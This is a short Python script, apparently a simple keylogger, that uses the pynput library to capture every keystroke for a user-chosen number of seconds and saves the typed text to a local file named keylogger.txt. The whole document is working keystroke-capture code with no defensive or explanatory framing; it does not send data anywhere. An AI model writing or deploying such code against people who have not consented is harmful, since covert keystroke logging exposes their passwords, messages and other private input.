from pynput import keyboard
import time
import threading

result = ""

def on_press(key):
    global result
    try:
        result += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            result += " "
        else:
            result += " " + str(key) + " "

    with open("keylogger.txt", "w") as file:
        file.write(result)

recording_time = int(input("Enter the recording time in seconds: "))

def run_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        stop_thread = threading.Thread(target=stop_listener, args=(listener, recording_time))
        stop_thread.start()
        listener.join()

def stop_listener(listener, duration):
    time.sleep(duration)
    listener.stop()

run_listener()

